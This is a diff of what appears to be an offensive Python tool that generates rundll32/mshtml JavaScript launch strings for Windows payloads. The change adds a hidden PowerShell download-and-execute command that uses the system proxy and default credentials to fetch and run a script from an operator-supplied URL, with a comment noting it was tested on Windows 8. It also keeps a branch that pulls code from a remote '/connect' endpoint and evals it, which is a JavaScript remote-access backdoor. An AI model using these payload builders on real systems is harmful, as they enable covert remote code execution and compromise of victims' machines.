@@ -36,7 +36,11 @@ if args.payload is not None:
 
 if args.rshell is not None:
     # command='powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c IEX ((New-Object Net.WebClient).DownloadString(&#39;' + args.rshell + '&#39;));&cmd /c taskkill /f /im rundll32.exe'
-    command='''javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c IEX ((New-Object Net.WebClient).DownloadString(&#39;''' + args.rshell + '''&#39;));&cmd /c taskkill /f /im rundll32.exe'",0,true);'''
+
+    # command='''javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c IEX ((New-Object Net.WebClient).DownloadString(&#39;''' + args.rshell + '''&#39;));&cmd /c taskkill /f /im rundll32.exe'",0,true);'''
+    # windows8 測試通過，windows7 不通過
+
+    command='''javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell.exe -nop -w hidden -c $n=new-object net.webclient;$n.proxy=[Net.WebRequest]::GetSystemWebProxy();$n.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $n.downloadstring("''' + args.rshell + '''"));&cmd /c taskkill /f /im rundll32.exe'",0,true);'''
     
 if args.jsrat is not None:
     command='javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","' + args.jsrat + '/connect",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}'
